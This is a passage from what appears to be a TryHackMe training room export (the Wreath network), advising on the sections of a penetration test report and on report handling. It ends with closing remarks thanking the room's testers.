/></p><hr /><p>Penetration test reports are generally split into several sections. There is no strictly defined standard unfortunately, but the following layout should be well received:<br /></p><ul><li>First up is the <b><i>Executive Summary</i></b>. This should be essentially non-technical, providing a brief overview of the job that was contracted to (and completed by) the pentester, including a concise summary of the scope of the engagement. You should also include a very short summary of the results here, as well as a concise analysis of the overall security posture of the company. Be aware thought that, as the name suggests, this section is designed to be read by the higher-ups in a company who may not have a technical background or the time to devote to a long-winded explanation. This section is particularly important as in many cases it may be the only section that the client actually looks at. It should catch the eye, and will set the tone for the rest of the report.<br /></li><li>At the end of (or immediately after) the executive summary include a <i><b>Timeline</b></i> showing an overview of what you did and when you did it. This allows whoever is assigned to fix the vulnerabilities to check any logs from the compromised system and see what a successful attack looks like from their own privileged perspective.<br /></li><li>Next we have the <i><b>Findings and Remediations </b></i>section. This should be a more technical section. It should provide a detailed explanation of the <img style="width:200px;margin:40px;float:right" src="https://assets.tryhackme.com/additional/wreath-network/ZGQ1N2QwNWU5.png" class="note-float-right" />vulnerabilities you found <i>as well as your suggested fixes for these. </i>Additionally, you should indicate the severity of each vulnerability, and the risk to the company should the vulnerability be exploited by a bad actor -- the <a href="https://www.first.org/cvss/calculator/3.1" target="_blank">CVSS calculator</a> will be useful for this. You should not necessarily be providing a step-by-step account of your methodology here, but there should be enough detail for a technically-able person to see what the problem is, and what the solutions might be. <br /></li><li>After the findings and remediations should come the <i><b>Attack Narrative</b></i>. This <i>should</i> be a step-by-step writeup of the actions you took against the targets, including enough detail for a technically-competent individual to replicate the attacks exactly in an almost copy-and-paste approach. In many ways this is similar to a detailed write-up for a CTF.</li><li>A section that is good to include but often skipped: the <i><b>Cleanup</b></i> section. This should detail the actions you took to eradicate your presence on the targets (e.g. removing any added accounts, deleting exploits or created files, etc).</li><li>Next (but not last), there should be a <i><b>Conclusion</b></i>. This just summarises the report, rounding off the results and stressing the importance of patching as required.</li><li>Finally you should include <i><b>References</b></i> then <i><b>Appendices</b></i>. The references section includes full references to any works cited throughout the report (for example, maybe a quote or table from the OWASP website, or referencing a newspaper article on an attack which utilised a vulnerability found in the target network). The references section should also be used to link to relevant CVEs (Common Vulnerability and Exposure), CWEs (Common Weakness Enumerations), and/or CAPECs (Common Attack Pattern Enumerations and Classifications) for the found vulnerabilities. Your appendices should include any large pieces of information that would have cluttered up the main text. For example, if you had to edit an exploit (as we did during the Wreath network), you should include a full copy of the edited code as an appendix and reference it when mentioned in the other sections. Equally, any code you write should also be stored here (with the exception of short snippets and one-liners, which can be placed inline at the relevant section), along with any large amounts of data or big tables / diagrams.<br /></li></ul><p>So, the sections should be:</p><ol><li>Executive Summary</li><li>Timeline</li><li>Findings and Remediations</li><li>Attack Narrative</li><li>Cleanup</li><li>Conclusion</li><li>References</li><li>Appendices<br /></li></ol><p>Pentest reports will usually also have a branded front-cover and a table of contents before the report itself begins.<br /></p><p>There are many pentest report templates available on the Internet which can be used to provide a baseline for this. Many companies will also provide their penetration testers with a company-specific template to follow. Regardless, of whether you use a pre-built template or create your own, find a style and stick with it!</p><hr /><p><i>With your report written and proof-read, you send the PDF to Thomas then sit back and relax, your work is done!</i><br /></p>', 'taskType': 'none', 'taskNo': 45, 'taskCreated': '2021-01-29T11:02:11.699Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Write a report (or just read the information in the task).</p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>If you write a report you are welcome to keep it for your own records, or submit it to the room as a writeup for others to read!</p><p>In the real-world, a section of the pre-engagement meetings between the \nclient and the pentesting company would set out expectations for<i> </i>report\n handling procedures. This would cover things like the delivery method \nfor the report (i.e. how will it be transferred securely between the \nconsultants and the clients), as well as how (and when) consultant \ncopies of the report should be disposed of. Clients obviously do <i>not</i> want a report detailing their technical vulnerabilities falling into the wrong hands, so this section is very important. </p><hr /><p><i><b>Important!</b></i><br /></p><p>Consider the following brief to be the "report-handling procedures" for this assignment:<br /></p><i>Reports\n should be written in English and submitted as PDFs hosted on Github, Google \nDrive or somewhere else on the internet to be viewed in the browser with no downloads \nrequired. Reports should not contain answers to questions, as far as is possible (i.e. host names are fine, passwords or password hashes are not). As you are being encouraged to write these in the format of a \npenetration test report, writeups submitted in other formats will </i><u>not</u><i>\n be accepted to the room. If you want to do a video walkthrough of the \nnetwork then this can be linked to at the end of an otherwise complete \nPDF report.</i>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-info size-16">Conclusion</span> Final Thoughts', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/JKbUlVTA8uA" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Thus we reach the conclusion of the Wreath network.</p><p>We covered a wide range of topics in this room -- combined there was a lot of information to absorb, so kudos for getting here! Hopefully you\'ve learnt some new tricks along the way, no matter your prior experience (or at the very least been able to apply known concepts to a new situation).</p><p>This room was designed to be an introduction to the topics covered -- now that you\'ve completed Wreath you should be able to confidentally tackle some of the other networks on the site, if you haven\'t already.</p><p>A huge shoutout to all of the amazing testers of the Wreath Network! <br />In no particular order:<br /></p><ul><li><a href="https://tryhackme.com/p/timtaylor" target="_blank">timtaylor</a></li><li><a href="https://twitter.com/0dayCTF" target="_blank">0day</a></li><li><a href="https://tryhackme.com/p/briskets" target="_blank">briskets</a></li><li><a href="https://twitter.com/NinjaJc01" target="_blank">NinjaJc01</a></li><li><a href="https://twitter.com/SubitusNex" target="_blank">OmegaVoid</a></li><li><a href="https://twitter.com/TwoUnderscoresH" target="_blank">__H</a></li><li><a href="https://twitter.com/_Nixed/" target="_blank">Nix</a></li><li><a href="https://twitter.com/itsWavey_" target="_blank">Wavey</a></li><li><a href="https://twitter.com/lukeitslukas" target="_blank">lukeitslukas</a></li><li><a href="http://tryhackme.com/p/Esqy" target="_blank">Esqy</a><br /></li><li><a href="https://twitter.com/Vargnaar" target="_blank">Varg</a><br /><br /></li></ul><p>If you enjoyed this network, keep an eye out for more in the future!<br /><a href="https://twitter.com/MuirlandOracle" target="_blank">@MuirlandOracle</a><br /></p>', 'taskType': 'none', 'taskNo': 46, 'taskCreated': '2021-01-29T11:02:27.290Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Network Complete!<br />', 'hint': ''}]}]}